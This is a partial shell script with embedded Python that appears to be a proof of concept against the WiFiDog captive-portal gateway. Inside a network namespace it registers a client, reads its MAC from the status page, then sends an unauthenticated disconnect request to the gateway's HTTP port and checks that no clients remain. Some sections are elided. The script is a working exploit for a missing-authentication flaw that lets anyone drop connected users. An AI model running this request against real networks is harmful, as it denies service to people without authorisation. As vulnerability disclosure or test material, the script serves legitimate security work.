...
LOG="$ROOT_DIR/poc/poc-unauth-disconnect.log"
BEFORE="$ROOT_DIR/poc/poc-unauth-disconnect.before.html"
AFTER="$ROOT_DIR/poc/poc-unauth-disconnect.after.html"
...
# Register a client (adds it to client_list) so we have a target to disconnect.
nsenter -t \$client_pid -n python3 - <<'PY'
import socket
token = \"WIFIDOG_DISCONNECT_POC\"
req = (
...
# Fetch status before disconnect.
nsenter -t \$client_pid -n python3 - <<'PY' >\"$BEFORE\"
import socket
req = (
...
p = pathlib.Path(\"$BEFORE\")
data = p.read_text(encoding='utf-8', errors='ignore')
m = re.search(r\"\\bMAC:\\s*([0-9A-Fa-f:]{17})\\b\", data)
if not m:
    sys.exit(1)
print(m.group(1))
PY
...
# Unauthenticated disconnect (works when HTTPDUserName/Password are not set).
nsenter -t \$client_pid -n python3 - <<PY
import socket
mac = \"\$mac\"
token = \"WIFIDOG_DISCONNECT_POC\"
req = (
    f\"GET /wifidog/disconnect?mac={mac}&token={token} HTTP/1.0\\r\\n\"
    \"Host: 10.0.0.1\\r\\n\"
    \"\\r\\n\"
)
s = socket.create_connection(('10.0.0.1', 2060), timeout=2.0)
...
# Fetch status after disconnect.
nsenter -t \$client_pid -n python3 - <<'PY' >\"$AFTER\"
import socket
req = (
    \"GET /wifidog/status HTTP/1.0\\r\\n\"
    \"Host: 10.0.0.1\\r\\n\"
...
if command -v rg >/dev/null 2>&1; then
  rg -n "WIFIDOG_DISCONNECT_POC" "$BEFORE" || true
  rg -n "0 clients connected\\." "$AFTER" || true
fi
